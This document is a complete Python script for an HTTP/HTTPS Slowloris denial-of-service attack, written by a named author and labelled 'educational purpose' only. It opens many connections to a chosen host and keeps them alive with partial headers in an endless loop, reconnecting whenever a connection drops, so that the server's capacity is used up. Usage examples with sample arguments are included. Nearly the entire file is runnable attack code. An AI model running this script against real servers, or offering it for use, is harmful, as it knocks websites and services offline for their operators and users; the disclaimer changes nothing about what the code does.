###############################################################################
##                                                                            ##
##             Author: MAhmutAY   <mahmutayy@yahoo.com>                       ##
##              This is a  HTTP SLOWLORIS  attack script                      ##
##                                                                            ##
##              This is only educational purpose usage                        ##
##  !!  Do not attempt to violate the laws with anything contained here. !!!  ##
################################################################################

import socket
import ssl
import time
import argparse

def slowly_attack(target_host, target_port, num_sockets, sleep_time):
    sockets = []

    #  Determine whether the connection  type SSL/TLS or not
    use_ssl = target_port == 443 or target_port == 8443 or target_port == 8080  # Common HTTPS ports

    print(f"Creating {num_sockets} sockets to target {target_host}:{target_port} {'with SSL' if use_ssl else 'without SSL'}")
    
    # initializing the socket connections
    for _ in range(num_sockets):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)      #delay time between sockets created

            if use_ssl:
                # Create an SSL context
                context = ssl.create_default_context()
                sock = context.wrap_socket(sock, server_hostname=target_host)  # Wrap the socket with SSL

            sock.connect((target_host, target_port))
            sock.sendall("GET / HTTP/1.1\r\n".encode("utf-8"))
            sock.sendall(f"Host: {target_host}\r\n".encode("utf-8"))
            sock.sendall("User-Agent: SlowlorisTest\r\n".encode("utf-8"))     # you can change the "User-Agent" Header value 
            sock.sendall("Content-Length: 10000\r\n".encode("utf-8"))
            sockets.append(sock)
        except socket.error as e:
            print(f"Could not create socket: {e}")
            break

    # We keep sending partial headers to each socket to maintain the connection
    print("Maintaining connections...")
    while True:
        for sock in list(sockets):
            try:
                sock.sendall("X-a: keep-alive\r\n".encode("utf-8"))
            except socket.error:
                sockets.remove(sock)
                try:
                    # Recreate socket if connection was closed
                    new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    new_sock.settimeout(2)
                    
                    if use_ssl:
                        context = ssl.create_default_context()
                        new_sock = context.wrap_socket(new_sock, server_hostname=target_host)  # Wrap with SSL if HTTPS

                    new_sock.connect((target_host, target_port))
                    new_sock.sendall("GET / HTTP/1.1\r\n".encode("utf-8"))
                    new_sock.sendall(f"Host: {target_host}\r\n".encode("utf-8"))
                    new_sock.sendall("User-Agent: Slowloris\r\n".encode("utf-8"))
                    new_sock.sendall("Content-Length: 10000\r\n".encode("utf-8"))
                    sockets.append(new_sock)
                except socket.error as e:
                    print(f"Could not recreate socket: {e}")
                    continue
        print(f"Sent keep-alive headers to {len(sockets)} sockets.")
        time.sleep(sleep_time)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="HTTP/HTTPS Slowloris attack script for educational purposes only.",
        epilog=(
            "Example usage:\n"
            "  python3.X  HttpSlowloris.py <target_host> <target_port> <num_sockets> <sleep_time>\n\n"
            "Arguments:\n"
            "  target_host : The IP address or hostname of the target server\n"
            "  target_port : The port on the target server (80 for HTTP, 443 for HTTPS, etc.)\n"
            "  num_sockets : Number of socket connections to create\n"
            "  sleep_time  : Delay (in seconds) between sending keep-alive headers\n\n"
            "Example:\n"
            "  python3.12 HttpSlowloris.py www.example.com 443 10 15"
        )
    )
    parser.add_argument("host", help="Target host ")
    parser.add_argument("port", type=int, help="Target port  (80 for HTTP, 443 for HTTPS, etc.)")
    parser.add_argument("sockets", type=int, help="Number of sockets to use")
    parser.add_argument("sleep_time", type=float, help="Time to wait between sending headers")

    args = parser.parse_args()
    slowly_attack(args.host, args.port, args.sockets, args.sleep_time)
